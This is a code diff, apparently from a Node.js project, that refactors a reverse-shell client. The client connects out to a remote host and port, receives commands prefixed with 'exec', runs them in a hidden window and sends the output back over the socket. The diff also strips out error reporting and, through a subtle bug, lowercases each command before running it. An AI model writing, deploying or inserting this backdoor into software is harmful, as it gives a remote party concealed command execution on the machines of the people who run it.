@@ -13,6 +13,7 @@ let path = process.cwd();
 const PORT = process.env.PORT;
 const HOST = process.env.HOST;
 
+
 const client = new net.Socket();
 function connect() {
   client.connect(PORT, HOST, () => {
@@ -21,9 +22,10 @@ function connect() {
 }
 
 client.on("data", (data) => {
+	let dataStr = data.toString().toLowerCase();
   if (
-    data.toString().toLowerCase().startsWith("exec") &&
-    data.toString().toLowerCase().split(" ")[1] === "cd"
+    dataStr.startsWith("exec") &&
+    dataStr.split(" ")[1] === "cd"
   ) {
     path = shell.changeDir(data, path);
   }
@@ -33,16 +35,12 @@ client.on("data", (data) => {
       command,
       { cwd: path, windowsHide: true },
       (e, stdout, stderr) => {
-        // if (e instanceof Error) {
-        //   client.write(e);
-        // }
         client.write(`${stdout}\n`);
-        // client.write(`stderr: ${stderr}\n`);
       }
     );
   }
-  if (data.toString().toLowerCase().startsWith("exec"))
-    execute(data.toString().replace("exec", ""));
+  if (dataStr.toLowerCase().startsWith("exec"))
+    execute(dataStr.replace("exec", ""));
 });
 
 client.on("close", (e) => {
